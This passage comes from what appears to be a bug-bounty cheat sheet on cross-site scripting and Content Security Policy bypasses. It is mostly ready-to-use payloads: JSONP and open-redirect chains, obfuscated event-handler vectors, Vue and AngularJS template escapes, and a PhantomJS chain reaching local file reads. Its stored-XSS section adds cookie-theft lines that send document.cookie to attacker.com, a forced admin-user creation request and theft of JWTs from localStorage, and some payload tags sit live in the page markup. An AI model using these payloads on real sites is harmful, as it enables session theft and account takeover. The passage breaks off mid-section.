+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;</span>&gt;&lt;/<span style="color:#f92672">object</span>&gt;
+</span></span></code></pre></div><p>This works because <code>&lt;object&gt;</code> is unrestricted.</p>
+<hr>
+<h3 id="5-jsonp-endpoint-allowed-in-script-src">
+  <strong>5. JSONP Endpoint Allowed in <code>script-src</code></strong>
+  <a class="anchor" href="#5-jsonp-endpoint-allowed-in-script-src">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;none&#39;;
+script-src https://hello.example.com/test.js https://accounts.google.com/o/oauth2/revoke;
+</code></pre><p>JSONP endpoints return executable JavaScript using callback parameters.</p>
+<p><strong>Bypass request:</strong></p>
+<pre tabindex="0"><code>https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
+</code></pre><p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>The remote server returns <code>alert(1)</code> which executes due to JSONP behavior.</p>
+<hr>
+<h3 id="6-csp-bypass-using-file-upload-functionality">
+  <strong>6. CSP Bypass Using File Upload Functionality</strong>
+  <a class="anchor" href="#6-csp-bypass-using-file-upload-functionality">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;self&#39;;
+</code></pre><p>Even though <code>'self'</code> is strict, an app feature may allow uploading:</p>
+<ul>
+<li><code>.js</code></li>
+<li><code>.html</code></li>
+<li>or disguised text files</li>
+</ul>
+<p>If the file is served from the same origin, it becomes a trusted script source.</p>
+<p><strong>Bypass payload:</strong></p>
+<p>Upload:</p>
+<pre tabindex="0"><code>evil-script.js → contains alert(1)
+</code></pre><p>Then reference:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/uploads/evil-script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>This bypasses CSP entirely because the uploaded file is now same-origin.</p>
+<hr>
+<h3 id="7-bypassing-csp-in-angularjs">
+  <strong>7. Bypassing CSP in AngularJS</strong>
+  <a class="anchor" href="#7-bypassing-csp-in-angularjs">#</a>
+</h3>
+<ul>
+<li>Certain AngularJS versions (especially 1.0.x–1.2.x) allow execution through Expressions even when CSP mode is enabled.</li>
+<li>If the application loads AngularJS from an allowed domain, CSP can be bypassed via <code>ng-click</code> + <code>$event.view</code>.</li>
+</ul>
+<p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>ng-app ng-csp ng-click=$event.view.alert(&#39;payatu&#39;)&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>When clicked, it triggers JavaScript execution <strong>without needing <code>&lt;script&gt;</code> tags</strong>.</p>
+<hr>
+<h3 id="8-bypass-via-open-redirect-in-whitelisted-domain">
+  <strong>8. Bypass via Open Redirect in Whitelisted Domain</strong>
+  <a class="anchor" href="#8-bypass-via-open-redirect-in-whitelisted-domain">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: script-src &#39;self&#39; example.com/random/ website-with-redirect.com; object-src &#39;none&#39;;
+</code></pre><p>If a whitelisted domain contains an <strong>open redirect</strong>, the attacker can make the browser fetch <strong>arbitrary JS</strong> through it.</p>
+<p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://&lt;website-with-redirect&gt;.com/redirect?url=https%3A//example.com/o/revoke?callback=alert(&#39;payatu&#39;)&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>The redirect points to a JSONP endpoint → callback executes → CSP bypassed.</p>
+<hr>
+<h3 id="9-encoding--to-bypass-directory-restricted-csp">
+  <strong>9. Encoding <code>/</code> to Bypass Directory-Restricted CSP</strong>
+  <a class="anchor" href="#9-encoding--to-bypass-directory-restricted-csp">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: script-src https://&lt;abc&gt;.com/safe/
+</code></pre><p>If CSP restricts script loading to a specific directory:</p>
+<ul>
+<li>Browsers normalize <code>%2f</code> into <code>/</code></li>
+<li>Server may accept traversal sequences like <code>%2f..%2f</code></li>
+<li>Attacker can break out of the directory</li>
+</ul>
+<p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://&lt;abc&gt;.com/safe%2f..%2funsafe/evil.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>This loads the script from an <strong>unintended, unsafe directory</strong> while still matching the CSP rule syntactically.</p>
+<hr>
+<h3 id="10-csp-bypass-using-open-redirect--jsonp-chained-attack">
+  <strong>10. CSP Bypass Using Open Redirect + JSONP (Chained Attack)</strong>
+  <a class="anchor" href="#10-csp-bypass-using-open-redirect--jsonp-chained-attack">#</a>
+</h3>
+<p>This one is implied in Type 5 but more specifically a <strong>two-stage bypass</strong>:</p>
+<ol>
+<li>Use a whitelisted open redirector</li>
+<li>Redirect to a JSONP endpoint on another whitelisted domain</li>
+</ol>
+<p><strong>Example chain:</strong></p>
+<pre tabindex="0"><code>whitelisted-redirect.com → redirects to → google.com/revoke?callback=alert(1)
+</code></pre><p>This results in CSP mistakenly allowing external script execution.</p>
+<p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://whitelisted-redirect.com/r?url=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="event-handler-bypass">
+  <strong>Event Handler Bypass</strong>
+  <a class="anchor" href="#event-handler-bypass">#</a>
+</h2>
+<p>When <code>&lt;script&gt;</code> is filtered, event attributes still allow JavaScript execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">onmouseover</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;<span style="color:#a6e22e">Hover</span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span> <span style="color:#a6e22e">autofocus</span>&gt;
+</span></span></code></pre></div><p><strong>Less Common Event Vectors</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;<span style="color:#a6e22e">Click</span>&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">video</span> <span style="color:#a6e22e">onloadeddata</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">select</span> <span style="color:#a6e22e">onchange</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
+</span></span></code></pre></div><p><strong>SVG-Based XSS</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;<span style="color:#a6e22e">X</span>&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p><strong>JS Obfuscation / Evaluation</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">eval</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">String.fromCharCode</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">97</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">108</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">101</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">114</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">116</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">40</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">49</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">41</span><span style="color:#960050;background-color:#1e0010">))</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">eval</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">atob</span><span style="color:#960050;background-color:#1e0010">(&#39;</span><span style="color:#a6e22e">YWxlcnQoMSk</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;))</span>&gt;
+</span></span></code></pre></div><p><strong>Property Access Bypasses</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">window</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">top</span>&gt;
+</span></span></code></pre></div><p><strong>Using arrow functions &amp; template strings</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;(()=&gt;alert(1))()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert`${1}`&#34;</span>&gt;
+</span></span></code></pre></div><p><strong>Bypassing keyword filters</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Function</span><span style="color:#960050;background-color:#1e0010">(&#39;</span><span style="color:#a6e22e">al</span><span style="color:#960050;background-color:#1e0010">&#39;+&#39;</span><span style="color:#a6e22e">ert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&#39;)()</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#a6e22e">al</span><span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">ert</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}<span style="color:#960050;background-color:#1e0010">`(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="advanced-xss-scenarios">
+  Advanced XSS Scenarios
+  <a class="anchor" href="#advanced-xss-scenarios">#</a>
+</h2>
+<h3 id="1-phantomjs-html-injection--xss--ssrflfr">
+  1. PhantomJS HTML Injection → XSS → SSRF/LFR
+  <a class="anchor" href="#1-phantomjs-html-injection--xss--ssrflfr">#</a>
+</h3>
+<p>PhantomJS renders attacker-controlled HTML inside a <code>file://</code> context, so any parameter that accepts HTML (e.g., <code>header=</code>) becomes an XSS sink. Since PhantomJS uses <code>document.write()</code> and loads external resources, XSS quickly escalates into SSRF and then Local File Read.</p>
+<p><strong>How the Chain Works</strong></p>
+<ul>
+<li>
+<p><strong>1. HTML Injection → XSS:</strong></p>
+<p>Inject <code>&lt;img src=x onerror=...&gt;</code> or <code>&lt;script&gt;</code> inside headers/HTML rendered by PhantomJS.</p>
+</li>
+<li>
+<p><strong>2. XSS → SSRF:</strong></p>
+<p>Use injected JS to load URLs from internal network:</p>
+<p><code>new Image().src=&quot;http://127.0.0.1:8080/admin&quot;;</code></p>
+</li>
+<li>
+<p><strong>3. SSRF → Local File Read:</strong></p>
+<p>PhantomJS fetches <code>file://</code> paths, so attacker forces it to request:</p>
+<p><code>file:///etc/passwd</code> or other local files (PhantomJS returns raw content).</p>
+</li>
+<li>
+<p><strong>4. Data Exfil:</strong></p>
+<p>Steal file contents using DNS, fetch, <code>&lt;img src&gt;</code>, or error-based leaks.</p>
+</li>
+</ul>
+<p><strong>Why It Works</strong></p>
+<ul>
+<li>PhantomJS treats provided HTML as trusted.</li>
+<li>Allows synchronous external loads + <code>file://</code> access.</li>
+<li>No sandbox → complete local file exposure.</li>
+</ul>
+<p><strong>What to Test</strong></p>
+<ul>
+<li>Any HTML-rendered parameter (<code>header</code>, <code>footer</code>, <code>template</code>, <code>note</code>).</li>
+<li>Check if PhantomJS is used internally (HTML-to-PDF services).</li>
+<li>Try both <code>&lt;script&gt;</code> and event-handler XSS payloads.</li>
+</ul>
+<h3 id="2-csrf--xss-chaining">
+  <strong>2. CSRF + XSS Chaining</strong>
+  <a class="anchor" href="#2-csrf--xss-chaining">#</a>
+</h3>
+<h3 id="core-idea">
+  <strong>Core Idea:</strong>
+  <a class="anchor" href="#core-idea">#</a>
+</h3>
+<ul>
+<li><strong>XSS → execute JS</strong></li>
+<li><strong>CSRF → trigger victim’s authenticated actions</strong></li>
+<li><strong>Chain → attacker plants XSS using victim’s own session</strong></li>
+</ul>
+<h3 id="chaining-logic-">
+  <strong>Chaining Logic :</strong>
+  <a class="anchor" href="#chaining-logic-">#</a>
+</h3>
+<h3 id="1-use-xss-to-run-malicious-js">
+  <strong>1. Use XSS to run malicious JS</strong>
+  <a class="anchor" href="#1-use-xss-to-run-malicious-js">#</a>
+</h3>
+<ul>
+<li>Extract data (cookie, keystrokes, tokens)</li>
+<li>Or inject malicious HTML via browser APIs</li>
+<li>If CSP is restrictive, fall back to <code>&lt;img src&gt;</code>based signals</li>
+</ul>
+<h3 id="2-use-csrf-to-submit-authenticated-requests">
+  <strong>2. Use CSRF to submit authenticated requests</strong>
+  <a class="anchor" href="#2-use-csrf-to-submit-authenticated-requests">#</a>
+</h3>
+<ul>
+<li>HTML form auto-submit to a protected endpoint</li>
+<li>Browser sends session cookies automatically</li>
+</ul>
+<h3 id="3-use-csrf-to-plant-xss-into-a-stored-field">
+  <strong>3. Use CSRF to plant XSS into a stored field</strong>
+  <a class="anchor" href="#3-use-csrf-to-plant-xss-into-a-stored-field">#</a>
+</h3>
+<ul>
+<li>CSRF submits a request containing HTML/JS into a parameter</li>
+<li>Server stores this content</li>
+<li>When user/admin views it, XSS triggers</li>
+</ul>
+<h3 id="4-resulting-chain">
+  <strong>4. Resulting chain</strong>
+  <a class="anchor" href="#4-resulting-chain">#</a>
+</h3>
+<p><strong>CSRF stores XSS → Stored XSS executes → Exfiltration or Account Takeover</strong></p>
+<h3 id="3-bypass-httponly--xss-escalation">
+  3. Bypass HttpOnly → XSS Escalation
+  <a class="anchor" href="#3-bypass-httponly--xss-escalation">#</a>
+</h3>
+<p><strong>Always analyze the local storage of application</strong></p>
+<ul>
+<li>Once found an xss , or reflection and if the document.cookie do not reveals the cookie because of HttpOnly flag</li>
+<li>Inspect the app. —&gt;Application—&gt; Check the local storage —&gt; check if any credentials / JWT or PII is present by the mistake of developer</li>
+<li>If JWT is present ,</li>
+<li>localStorage.jwtToken</li>
+<li>Use this in xss payload</li>
+</ul>
+<script>alert(localStorage.jwtToken)</script>
+<h3 id="4-xss-in-chatbot-message-renderer">
+  <strong>4. XSS in Chatbot Message Renderer</strong>
+  <a class="anchor" href="#4-xss-in-chatbot-message-renderer">#</a>
+</h3>
+<h3 id="summary">
+  <strong>Summary</strong>
+  <a class="anchor" href="#summary">#</a>
+</h3>
+<p>A chatbot UI was reflecting user input directly into the DOM <strong>without sanitization</strong>, causing <strong>HTML Injection → XSS</strong> whenever a user sent HTML/JS content.</p>
+<h3 id="root-cause">
+  <strong>Root Cause</strong>
+  <a class="anchor" href="#root-cause">#</a>
+</h3>
+<ul>
+<li>Chatbot accepted user messages as <strong>raw HTML</strong></li>
+<li>Client-side renderer directly injected content into DOM (e.g., <code>innerHTML</code>)</li>
+<li>No filtering/escaping → user-controlled HTML executed</li>
+</ul>
+<h3 id="how-vulnerability-was-found">
+  <strong>How Vulnerability Was Found</strong>
+  <a class="anchor" href="#how-vulnerability-was-found">#</a>
+</h3>
+<ol>
+<li>Subdomain enumeration found a <strong>support chatbot</strong>.</li>
+<li>Tester sent <code>&lt;u&gt;test&lt;/u&gt;</code> → <strong>HTML rendered</strong> → confirmed HTML injection.</li>
+<li>Tried a basic XSS payload → <strong>executed</strong> inside chatbot window.</li>
+</ol>
+<h3 id="payload-">
+  <strong>Payload :</strong>
+  <a class="anchor" href="#payload-">#</a>
+</h3>
+<img src=x onerror=alert(1)>
+<h3 id="impact">
+  <strong>Impact</strong>
+  <a class="anchor" href="#impact">#</a>
+</h3>
+<ul>
+<li>Executes in victim&rsquo;s browser context</li>
+<li>Access to <strong>cookies, session tokens, localStorage</strong></li>
+<li>Potential <strong>account takeover</strong>, <strong>chat takeover</strong>, or <strong>internal tool hijacking</strong></li>
+</ul>
+<h3 id="exploit-flow">
+  <strong>Exploit Flow</strong>
+  <a class="anchor" href="#exploit-flow">#</a>
+</h3>
+<p>User input → Chatbot DOM renderer → HTML interpreted → JS executes → Attacker gains browser-level privileges</p>
+<h3 id="5-stored-xss-in-gitlab-user-profile">
+  <strong>5. Stored XSS in GitLab User Profile</strong>
+  <a class="anchor" href="#5-stored-xss-in-gitlab-user-profile">#</a>
+</h3>
+<ul>
+<li>Summary
+GitLab had a Stored XSS vulnerability in the <strong>Full Name</strong> field of the user profile. Attackers could store JavaScript inside this field, and the payload executed whenever an <strong>admin viewed the profile</strong>, leading to high-impact account compromise.</li>
+</ul>
+<h3 id="root-cause-1">
+  <strong>Root Cause</strong>
+  <a class="anchor" href="#root-cause-1">#</a>
+</h3>
+<ul>
+<li><strong>Improper sanitization</strong> of the “Full Name” field</li>
+<li>HTML/JS was stored in DB → rendered unsafely in profile pages</li>
+<li>Admin panel displayed this field directly → script executed in <strong>admin context</strong></li>
+</ul>
+<h3 id="injection-point">
+  <strong>Injection Point</strong>
+  <a class="anchor" href="#injection-point">#</a>
+</h3>
+<ul>
+<li><strong>Location:</strong> <code>Profile → Full Name</code></li>
+<li><strong>Behavior:</strong> Stored as-is → rendered with HTML interpretation</li>
+<li><strong>Typical payloads:</strong>
+<ul>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="exploit-flow-1">
+  <strong>Exploit Flow:</strong>
+  <a class="anchor" href="#exploit-flow-1">#</a>
+</h3>
+<h3 id="1-attacker-edits-profile">
+  <strong>1. Attacker edits profile</strong>
+  <a class="anchor" href="#1-attacker-edits-profile">#</a>
+</h3>
+<p><code>Full Name = &lt;img src=x onerror=alert(document.cookie)&gt;</code></p>
+<h3 id="2-server-stores-payload-in-db">
+  <strong>2. Server stores payload in DB</strong>
+  <a class="anchor" href="#2-server-stores-payload-in-db">#</a>
+</h3>
+<p>Stored XSS → persistent until manually removed.</p>
+<h3 id="3-admin-opens-attackers-profile">
+  <strong>3. Admin opens attacker’s profile</strong>
+  <a class="anchor" href="#3-admin-opens-attackers-profile">#</a>
+</h3>
+<p>Admin page loads the malicious Full Name value.</p>
+<h3 id="4-script-executes-in-admins-browser">
+  <strong>4. Script executes in admin’s browser</strong>
+  <a class="anchor" href="#4-script-executes-in-admins-browser">#</a>
+</h3>
+<p>Runs with <strong>admin privileges + admin cookies</strong>.</p>
+<h3 id="5-attacker-gains-control">
+  <strong>5. Attacker gains control</strong>
+  <a class="anchor" href="#5-attacker-gains-control">#</a>
+</h3>
+<ul>
+<li>Steals admin session</li>
+<li>Performs admin actions</li>
+<li>Modifies settings / adds users</li>
+<li>Extracts sensitive data</li>
+</ul>
+<h3 id="its-of-high-impact">
+  <strong>It’s of High Impact</strong>
+  <a class="anchor" href="#its-of-high-impact">#</a>
+</h3>
+<p>Stored XSS + Admin execution = <strong>full administrative takeover</strong>.</p>
+<h3 id="potential-payloads">
+  <strong>Potential Payloads</strong>
+  <a class="anchor" href="#potential-payloads">#</a>
+</h3>
+<ul>
+<li><strong>Cookie theft</strong>
+&lt;img src=x onerror=fetch(&lsquo;<a href="https://attacker.com/?c=%27&#43;document.cookie%29%3e" target="_blank" rel="noreferrer noopener nofollow">https://attacker.com/?c='+document.cookie)></a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><strong>Auto-admin action</strong></li>
+</ul>
+<script>
+  fetch('/admin/users/add', {method:'POST',credentials:'include'});
+</script>
+<ul>
+<li><strong>Silent redirect</strong></li>
+</ul>
+<script>location='https://attacker.com/steal?c='+document.cookie</script>
+<h2 id="framework-specific-vectors">
+  Framework-Specific Vectors
+  <a class="anchor" href="#framework-specific-vectors">#</a>
+</h2>
+<h3 id="1-vuejs">
+  1. Vue.js
+  <a class="anchor" href="#1-vuejs">#</a>
+</h3>
+<ul>
+<li>Vue.js is a popular JavaScript frontend framework used for building interactive UI components. It stores internal rendering data inside JavaScript objects, which makes it sensitive to prototype manipulation.</li>
+</ul>
+<h3 id="vuejs--prototype-pollution--xss-cve-2024-6783">
+  <strong>Vue.js – Prototype Pollution → XSS (CVE-2024-6783)</strong>
+  <a class="anchor" href="#vuejs--prototype-pollution--xss-cve-2024-6783">#</a>
+</h3>
+<ul>
+<li>CVE-2024-6783 is an <strong>XSS vulnerability caused by prototype pollution inside Vue.js rendering internals</strong>.If an attacker can inject a polluted property (like <code>staticClass</code> or <code>staticStyle</code>) into <strong>Object.prototype</strong>, Vue will unintentionally use the attacker-controlled value while rendering components, resulting in <strong>automatic execution of attacker-controlled JavaScript</strong>.</li>
+</ul>
+<h3 id="flow-of-attack-">
+  Flow of Attack :
+  <a class="anchor" href="#flow-of-attack-">#</a>
+</h3>
+<ol>
+<li><strong>Application accepts user-controlled JSON</strong> without sanitizing keys.</li>
+<li>The attacker sends JSON containing <code>&quot;__proto__&quot;</code> — this causes <strong>prototype pollution</strong>.</li>
+<li>Polluted properties like <code>staticClass</code> or <code>staticStyle</code> get added to <strong>Object.prototype</strong>.</li>
+<li>Vue.js uses these properties during component rendering.</li>
+<li>The value injected here contains JavaScript code (usually via <code>constructor.constructor(...)</code>).</li>
+<li>When Vue renders any component afterward, the polluted property is processed → <strong>XSS executes automatically</strong>.</li>
+</ol>
+<p>{
+&ldquo;<strong>proto</strong>&rdquo;: {
+&ldquo;staticClass&rdquo;: &ldquo;{constructor.constructor(&lsquo;alert(&quot;XSS via Vue pollution&quot;)&rsquo;)()}&rdquo;
+}
+}</p>
+<h3 id="payloads-">
+  <strong>Payloads :</strong>
+  <a class="anchor" href="#payloads-">#</a>
+</h3>
+<ul>
+<li>{{_Vue.h.constructor<code>alert(1)</code>()}}</li>
+<li>{{$emit.constructor<code>alert(1)</code>()}}</li>
+<li>{{constructor.constructor(’alert(1)’)()}</li>
+<li>{{_Vue.h.constructor(&lsquo;x&rsquo;,&lsquo;console.log(&ldquo;HI this is sid0krypt&rdquo;)&rsquo;)(this)}}</li>
+<li>{{_Vue.h.constructor(&lsquo;x&rsquo;,&lsquo;console.log(x)&rsquo;)(this)}}</li>
+</ul>
+<h3 id="2-angularjs">
+  2. AngularJS
+  <a class="anchor" href="#2-angularjs">#</a>
+</h3>
+<ul>
+<li>AngularJS is a frontend framework using template expressions. Early versions (especially ≤1.6) allowed <strong>sandbox escapes</strong> leading to XSS.</li>
+</ul>
+<h3 id="angularjs--expression-sandbox-escape">
+  <strong>AngularJS – Expression Sandbox Escape</strong>
+  <a class="anchor" href="#angularjs--expression-sandbox-escape">#</a>
+</h3>
+<ul>
+<li>AngularJS evaluates <code>{{ }}</code> expressions in templates.</li>
+<li>Older versions had <strong>sandbox bypasses</strong>, allowing attackers to access <code>Function</code> constructors and execute arbitrary JavaScript.</li>
+</ul>
+<h3 id="flow-of-attack--1">
